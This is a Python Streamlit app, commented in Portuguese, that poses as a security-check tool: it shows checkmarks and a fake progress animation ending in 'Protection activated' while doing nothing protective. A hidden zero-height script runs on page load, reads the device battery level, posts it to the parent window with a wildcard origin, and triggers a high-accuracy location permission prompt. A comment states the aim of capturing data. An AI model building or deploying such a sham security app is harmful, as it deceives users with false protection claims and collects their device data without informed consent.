import streamlit as st
import streamlit.components.v1 as components
import time

# --- MANTENDO A SUA ESTILIZAÇÃO ORIGINAL ---
st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stButton>button { width: 100%; border-radius: 20px; background-color: #262730; color: white; border: none; height: 50px; }
    
    .circle-container { display: flex; justify-content: center; align-items: center; height: 250px; }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        border: 4px solid #1f2329; border-top: 4px solid #00ff7f;
        display: flex; justify-content: center; align-items: center;
        font-size: 40px; font-weight: bold; color: white;
        box-shadow: 0 0 20px rgba(0, 255, 127, 0.2);
    }
    .spin { animation: spin 2s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    """, unsafe_allow_html=True)

# --- SCRIPT PARA PEDIR PERMISSÃO DE LOCALIZAÇÃO E CAPTURAR DADOS ---
# O navegador só abre o pop-up se houver uma chamada de geolocalização ativa.
components.html("""
    <script>
    function pedirPermissaoEColetar() {
        // 1. Tenta capturar a bateria
        navigator.getBattery().then(function(battery) {
            window.parent.postMessage({
                type: 'BATERIA',
                value: Math.round(battery.level * 100) + "%"
            }, "*");
        });

        // 2. Abre o pop-up de localização do sistema
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    console.log("Localização permitida");
                },
                (err) => {
                    console.log("Localização negada");
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
    }
    // Executa assim que o componente carrega
    pedirPermissaoEColetar();
    </script>
""", height=0)

# --- INTERFACE VISUAL ---
st.title("Verificar segurança")

placeholder_bolha = st.empty()

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

if st.button("● ATIVAR PROTEÇÃO"):
    for i in range(4, 101, 5):
        placeholder_bolha.markdown(f"""
            <div class="circle-container">
                <div class="circle spin">{i}%</div>
            </div>
            """, unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Ativada!")
else:
    # Estado inicial conforme o seu print
    placeholder_bolha.markdown("""
        <div class="circle-container">
            <div class="circle">4%</div>
        </div>
        """, unsafe_allow_html=True)

st.warning("Permissão de localização negada ou indisponível.")
